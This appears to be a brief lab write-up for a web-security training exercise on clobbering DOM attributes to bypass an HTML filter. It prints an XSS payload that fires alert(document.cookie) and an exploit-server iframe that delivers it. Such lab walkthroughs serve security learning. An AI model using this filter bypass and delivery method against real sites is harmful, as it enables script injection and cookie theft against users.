Clobbering DOM attributes to bypass HTML filters

Again, we can use HTML in comments. Let's prepare the payload:

<form id=x tabindex=0 onfocus=alert(document.cookie)><input id=attributes>

And add the exploit to the exploit server:

<iframe src=https://your-lab-id.web-security-academy.net/post?postId=2 onload="setTimeout(someArgument=>this.src=this.src+'#x',500)">

Make sure the postId matches with the one where you made your comment.
Store and deliver. Again, the lab solution describes the solution much better than I can. The curse of Expert labs.
